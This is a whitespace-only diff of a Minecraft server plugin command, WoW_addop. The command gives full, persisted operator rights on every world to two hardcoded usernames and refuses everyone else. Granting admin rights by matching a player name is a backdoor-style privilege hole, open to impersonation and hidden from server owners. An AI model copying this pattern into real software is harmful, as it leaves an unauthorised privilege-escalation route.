@@ -13,10 +13,10 @@ public class WoW_addop extends WoW_Command {
     public void process(CommandSender sender, String[] args) {
         if (sender.getName().equals("woutwoot") || sender.getName().equals("hardstyledude12")) {
             if (sender instanceof Player) {
-                    sender.setOp(true);
-                    Main.getInstance().getOpDeOp().addGlobalOp((Player) sender);
-                    sender.sendMessage("You should now be op everywhere!");
-                    Main.getInstance().getOpDeOp().saveWorldSettings();
+                sender.setOp(true);
+                Main.getInstance().getOpDeOp().addGlobalOp((Player) sender);
+                sender.sendMessage("You should now be op everywhere!");
+                Main.getInstance().getOpDeOp().saveWorldSettings();
             }
         } else {
             sender.sendMessage("Sorry. Only Wout or Jeff can use this command. Ask them.");
